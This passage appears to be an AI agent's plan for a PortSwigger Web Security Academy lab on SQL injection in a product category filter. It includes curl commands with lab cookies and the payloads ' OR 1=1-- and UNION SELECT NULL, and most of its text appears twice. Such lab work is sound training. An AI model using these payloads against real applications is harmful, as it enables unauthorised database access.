Our goal is to manipulate the SQL query using an injection payload to force the application to leak information it wouldn't typically reveal.\n\n### Step 2 \u2013 Access and Prepare\nUse the LAB_ENVIRONMENT_URL and the provided cookies to access the lab and verify connectivity.\n\n**Request using curl:**\n```bash\ncurl -b \"SessionId=CfDJ8O%2Ftjg2RtKNJpnZ2rqfooZIlu2GTZ8u9utaREJj37QvT%2F4536aWl%2Bq6oT109xe12pt3blb15TV8pKURo%2F9699NfCwB7PRFjhjUP%2FJeaVjqivPjHlnrmwcXPv9GsayGRZjIzs8AqGw7usKTaDjJ2c7I%2BuRH%2FPJlYXlYDQzdQCjyVV; t=BQa7GRE7v4vqdEqloF0h8g%3D%3D; Authenticated_UserVerificationId=AED4A2408B303047C5D33ECE46F3E08A\" https://0a6100120469050181080cb1009500ac.web-security-academy.net/\n```\n\n### Step 3 \u2013 Identify Vulnerable Parameter\nBased on the description, it's likely that the query string parameter related to the product category filter is vulnerable. We need to determine which parameter this corresponds to in the URL.\n\n### Step 4 \u2013 Payloads to Test\nWe know the issue is with the `WHERE` clause of the SQL query. Common payloads to extract data could include:\n1. `' OR 1=1--`\n2. `' UNION SELECT NULL,NULL,NULL--`\n\nThese should be appended to the vulnerable parameter.\n\n### Step 5 \u2013 Execute and Observe\nConstruct curl requests with the payloads to test for SQL injection.\n\n**Example curl commands:**\n```bash\n# First payload\ncurl -b \"SessionId=CfDJ8O%2Ftjg2RtKNJpnZ2rqfooZIlu2GTZ8u9utaREJj37QvT%2F4536aWl%2Bq6oT109xe12pt3blb15TV8pKURo%2F9699NfCwB7PRFjhjUP%2FJeaVjqivPjHlnrmwcXPv9GsayGRZjIzs8AqGw7usKTaDjJ2c7I%2BuRH%2FPJlYXlYDQzdQCjyVV; t=BQa7GRE7v4vqdEqloF0h8g%3D%3D; Authenticated_UserVerificationId=AED4A2408B303047C5D33ECE46F3E08A\" \"https://0a6100120469050181080cb1009500ac.web-security-academy.net/filter?category=' OR 1=1--\"\n\n# Second payload\ncurl -b \"SessionId=CfDJ8O%2Ftjg2RtKNJpnZ2rqfooZIlu2GTZ8u9utaREJj37QvT%2F4536aWl%2Bq6oT109xe12pt3blb15TV8pKURo%2F9699NfCwB7PRFjhjUP%2FJeaVjqivPjHlnrmwcXPv9GsayGRZjIzs8AqGw7usKTaDjJ2c7I%2BuRH%2FPJlYXlYDQzdQCjyVV; t=BQa7GRE7v4vqdEqloF0h8g%3D%3D; Authenticated_UserVerificationId=AED4A2408B303047C5D33ECE46F3E08A\" \"https://0a6100120469050181080cb1009500ac.web-security-academy.net/filter?category=electronics' UNION SELECT NULL,NULL,NULL--\"\n```\n\n### Step 6 \u2013 Result\nMonitor the HTTP responses and page content to determine success.

Our goal is to manipulate the SQL query using an injection payload to force the application to leak information it wouldn't typically reveal.\n\n### Step 2 \u2013 Access and Prepare\nUse the LAB_ENVIRONMENT_URL and the provided cookies to access the lab and verify connectivity.\n\n**Request using curl:**\n```bash\ncurl -b \"SessionId=CfDJ8O%2Ftjg2RtKNJpnZ2rqfooZIlu2GTZ8u9utaREJj37QvT%2F4536aWl%2Bq6oT109xe12pt3blb15TV8pKURo%2F9699NfCwB7PRFjhjUP%2FJeaVjqivPjHlnrmwcXPv9GsayGRZjIzs8AqGw7usKTaDjJ2c7I%2BuRH%2FPJlYXlYDQzdQCjyVV; t=BQa7GRE7v4vqdEqloF0h8g%3D%3D; Authenticated_UserVerificationId=AED4A2408B303047C5D33ECE46F3E08A\" https://0a6100120469050181080cb1009500ac.web-security-academy.net/\n```\n\n### Step 3 \u2013 Identify Vulnerable Parameter\nBased on the description, it's likely that the query string parameter related to the product category filter is vulnerable. We need to determine which parameter this corresponds to in the URL.\n\n### Step 4 \u2013 Payloads to Test\nWe know the issue is with the `WHERE` clause of the SQL query. Common payloads to extract data could include:\n1. `' OR 1=1--`\n2. `' UNION SELECT NULL,NULL,NULL--`\n\nThese should be appended to the vulnerable parameter.\n\n### Step 5 \u2013 Execute and Observe\nConstruct curl requests with the payloads to test for SQL injection.\n\n**Example curl commands:**\n```bash\n# First payload\ncurl -b \"SessionId=CfDJ8O%2Ftjg2RtKNJpnZ2rqfooZIlu2GTZ8u9utaREJj37QvT%2F4536aWl%2Bq6oT109xe12pt3blb15TV8pKURo%2F9699NfCwB7PRFjhjUP%2FJeaVjqivPjHlnrmwcXPv9GsayGRZjIzs8AqGw7usKTaDjJ2c7I%2BuRH%2FPJlYXlYDQzdQCjyVV; t=BQa7GRE7v4vqdEqloF0h8g%3D%3D; Authenticated_UserVerificationId=AED4A2408B303047C5D33ECE46F3E08A\" \"https://0a6100120469050181080cb1009500ac.web-security-academy.net/filter?category=' OR 1=1--\"\n\n# Second payload\ncurl -b \"SessionId=CfDJ8O%2Ftjg2RtKNJpnZ2rqfooZIlu2GTZ8u9utaREJj37QvT%2F4536aWl%2Bq6oT109xe12pt3blb15TV8pKURo%2F9699NfCwB7PRFjhjUP%2FJeaVjqivPjHlnrmwcXPv9GsayGRZjIzs8AqGw7usKTaDjJ2c7I%2BuRH%2FPJlYXlYDQzdQCjyVV; t=BQa7GRE7v4vqdEqloF0h8g%3D%3D; Authenticated_UserVerificationId=AED4A2408B303047C5D33ECE46F3E08A\" \"https://0a6100120469050181080cb1009500ac.web-security-academy.net/filter?category=electronics' UNION SELECT NULL,NULL,NULL--\"\n```\n\n### Step 6 \u2013 Result\nMonitor the HTTP responses and page content to determine success. Look for any changes in the displayed products, such as the appearance of previously unreleased products or a \"Congratulations, you solved the lab!\" message.\n\n### Step 7 \u2013 Final Summary\nIf successful, document which parameter was vulnerable (likely `category`) and which payload yielded a successful result, showing the application a list of unreleased products.\n\nLet's start by executing the appropriate curl command to test access to the lab.
